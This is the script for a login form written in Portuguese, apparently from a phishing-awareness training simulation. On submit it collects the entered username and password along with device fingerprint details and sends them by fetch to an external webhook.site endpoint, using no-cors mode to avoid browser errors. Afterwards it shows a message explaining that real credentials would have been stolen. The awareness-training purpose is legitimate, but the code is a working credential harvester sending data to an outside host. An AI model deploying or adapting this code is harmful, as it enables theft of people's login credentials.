<script>
        // ************ CONFIGURAÇÃO OBRIGATÓRIA ************
        const WEBHOOK_URL = "https://webhook.site/#!/view/72732b6b-cd3a-4490-84a7-348c6a3f55d4"; // 
        // ************ ************************ ************

        document.getElementById('loginForm').addEventListener('submit', async function(event) {
            event.preventDefault();
            console.log("Botão clicado - Iniciando processo...");

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const alertBox = document.getElementById('alertMessage');

            // 1. Mostra mensagem de carregamento
            alertBox.style.display = 'block';
            alertBox.style.color = 'black';
            alertBox.style.backgroundColor = '#d1ecf1';
            alertBox.innerHTML = '<strong>Processando...</strong>';

            // 2. Coleta as informações
            const deviceInfo = {
                credenciais: { usuario: username, senha: password },
                dispositivo: {
                    userAgent: navigator.userAgent,
                    linguagem: navigator.language,
                    plataforma: navigator.platform,
                    larguraTela: screen.width,
                    alturaTela: screen.height,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                },
                timestamp: new Date().toLocaleString('pt-BR')
            };

            console.log("Dados coletados:", deviceInfo);

            // 3. Tenta enviar para o Webhook
            try {
                console.log("Enviando para:", WEBHOOK_URL);
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    mode: 'no-cors', // <-- ADICIONA ISSO para contornar erro de CORS
                    body: JSON.stringify(deviceInfo)
                });
                // Com 'no-cors', a response será opaca, então não podemos ver o status.
                console.log("Dados aparentemente enviados (modo no-cors)");

                // 4. Mostra mensagem de SUCESSO para o usuário
                alertBox.style.backgroundColor = '#d4edda';
                alertBox.style.color = '#155724';
                alertBox.innerHTML = `
                    <strong>✅ Simulação Concluída!</strong><br>
                    Dados de teste e informações do dispositivo foram capturados para demonstração.
                    <br><br>
                    <strong>Lição:</strong> Em um ataque real, suas credenciais reais já teriam sido roubadas.
                `;
                document.getElementById('loginForm').reset();

            } catch (error) {
                // 5. Mostra mensagem de FALHA para o usuário
                console.error("Erro completo:", error);
                alertBox.style.backgroundColor = '#f8d7da';
                alertBox.style.color = '#721c24';
                alertBox.innerHTML = `
                    <strong>❌ Falha na Simulação</strong><br>
                    Ocorreu um erro técnico. Por favor, informe ao instrutor.
                    <br><br> 
                    <code>${error.message}</code>
                `;
            }
        });
    </script>
